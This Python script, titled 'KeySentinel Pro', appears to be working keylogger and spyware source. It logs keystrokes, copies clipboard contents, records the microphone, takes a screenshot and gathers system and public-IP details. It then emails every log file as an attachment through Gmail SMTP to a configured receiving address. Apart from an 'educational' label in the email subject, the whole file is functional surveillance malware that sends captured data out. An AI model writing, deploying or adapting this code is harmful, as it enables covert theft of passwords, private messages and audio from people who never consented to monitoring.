from pynput.keyboard import Listener, Key
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import requests
import win32clipboard
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab
import os

# --------------------- CONFIGURATION ---------------------

EMAIL_ADDRESS = "your_email@gmail.com"
EMAIL_PASSWORD = "your_app_password"  # Use an App Password if using Gmail
TO_ADDRESS = "receiver_email@gmail.com"

# Folder where all logs will be stored
BASE_PATH = "C:\\Users\\YourUsername\\Desktop\\keylogger_logs"
os.makedirs(BASE_PATH, exist_ok=True)

# File names
FILES = {
    "keylog": "keystrokes.txt",
    "clipboard": "clipboard.txt",
    "system": "system_info.txt",
    "audio": "voice.wav",
    "screenshot": "screenshot.png"
}

# --------------------- KEYLOGGER ---------------------

keys = []

def on_press(key):
    keys.append(key)
    write_keys_to_file(keys)
    keys.clear()

def write_keys_to_file(keys):
    file_path = os.path.join(BASE_PATH, FILES['keylog'])
    with open(file_path, "a") as file:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k:
                file.write('\n')
            elif "Key" not in k:
                file.write(k)

def on_release(key):
    if key == Key.enter:
        return False  # Ends logging on Enter key

# --------------------- SYSTEM INFO ---------------------

def get_system_info():
    file_path = os.path.join(BASE_PATH, FILES['system'])
    with open(file_path, "w") as file:
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            public_ip = requests.get("https://api64.ipify.org?format=text").text
        except:
            public_ip = "Could not retrieve"
        file.write(f"Public IP: {public_ip}\n")
        file.write(f"Processor: {platform.processor()}\n")
        file.write(f"System: {platform.system()} {platform.version()}\n")
        file.write(f"Machine: {platform.machine()}\n")
        file.write(f"Hostname: {hostname}\n")
        file.write(f"Local IP: {ip_addr}\n")

# --------------------- CLIPBOARD ---------------------

def get_clipboard_data():
    file_path = os.path.join(BASE_PATH, FILES['clipboard'])
    with open(file_path, "a") as file:
        try:
            win32clipboard.OpenClipboard()
            paste_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            file.write(f"Clipboard: {paste_data}\n")
        except:
            file.write("Clipboard: Data not accessible or not text.\n")

# --------------------- MICROPHONE RECORDING ---------------------

def record_audio():
    fs = 44100  # Sample rate
    seconds = 10
    try:
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(os.path.join(BASE_PATH, FILES['audio']), fs, recording)
    except Exception as e:
        print(f"[!] Could not record audio: {e}")

# --------------------- SCREENSHOT ---------------------

def take_screenshot():
    try:
        img = ImageGrab.grab()
        img.save(os.path.join(BASE_PATH, FILES['screenshot']))
    except Exception as e:
        print(f"[!] Screenshot failed: {e}")

# --------------------- EMAIL SENDER ---------------------

def send_email(filename, attachment):
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = TO_ADDRESS
    msg['Subject'] = "KeySentinel - Educational Log Report"

    msg.attach(MIMEText("Collected educational log data is attached.", "plain"))

    with open(attachment, 'rb') as attach_file:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attach_file.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={filename}')
        msg.attach(part)

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.sendmail(EMAIL_ADDRESS, TO_ADDRESS, msg.as_string())
        print(f"[+] Email sent: {filename}")
    except Exception as e:
        print(f"[!] Email sending failed for {filename}: {e}")

def send_all_logs():
    for label, filename in FILES.items():
        path = os.path.join(BASE_PATH, filename)
        if os.path.exists(path):
            send_email(filename, path)

# --------------------- MAIN WORKFLOW ---------------------

if __name__ == "__main__":
    print("[*] Starting KeySentinel Pro...")

    get_system_info()
    get_clipboard_data()
    record_audio()
    take_screenshot()

    print("[*] Starting keylogger. Press ENTER to stop.")

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print("[*] Keylogger stopped. Sending logs...")
    send_all_logs()
    print("[✔] All done.")
